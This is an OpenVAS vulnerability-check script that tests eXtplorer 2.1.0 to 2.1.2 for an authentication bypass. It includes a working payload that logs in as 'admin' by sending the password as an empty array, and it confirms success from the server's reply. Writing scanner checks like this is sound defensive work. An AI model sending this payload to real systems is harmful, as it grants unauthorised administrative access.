###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_eXtplorer_57058.nasl 11 2013-10-27 10:12:02Z jan $
#
# eXtplorer 'ext_find_user()' Function Authentication Bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "eXtplorer is prone to an authentication-bypass vulnerability.

Remote attackers can exploit this issue to bypass the authentication
mechanism and gain unauthorized access.

eXtplorer 2.1.2, 2.1.1, and 2.1.0 are vulnerable.";


tag_solution = "Updates are available; please see the references for more information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103639";
CPE = 'cpe:/a:extplorer:extplorer';

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(57058);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"9.7");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:P");

 script_name("eXtplorer 'ext_find_user()' Function Authentication Bypass Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/57058");
 script_xref(name : "URL" , value : "http://extplorer.net/");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-01-10 12:43:09 +0100 (Thu, 10 Jan 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to bypass authentication");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("gb_eXtplorer_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("eXtplorer/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);
host = get_host_name();

req = string("GET ",dir,"/index.php HTTP/1.1\r\n",
             "Host: ", host,"\r\n\r\n");

result = http_send_recv(port:port, data:req, bodyonly:FALSE);

if(!egrep(pattern:"<title>.*eXtplorer</title>", string:result))exit(0);

cookie = eregmatch(pattern:"Set-Cookie: eXtplorer=([^; ]+);", string:result);   
if(isnull(cookie[1]))exit(0);

co = cookie[1];

ex = 'option=com_extplorer&action=login&type=extplorer&username=admin&password[]=';
len = strlen(ex);

req = string("POST ",dir,"/index.php HTTP/1.1\r\n",
             "Host: ",host,"\r\n",
             "X-Requested-With: XMLHttpRequest\r\n",
             "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n",
             "Content-Length: ", len,"\r\n",
             "Cookie: eXtplorer=",co,"\r\n",
             "Pragma: no-cache\r\n",
             "Cache-Control: no-cache\r\n",
             "\r\n",
             ex);
   
result = http_send_recv(port:port, data:req, bodyonly:FALSE);

if("'Login successful!" >< result) {
  
  security_hole(port:port);
  exit(0);

}  

exit(0);
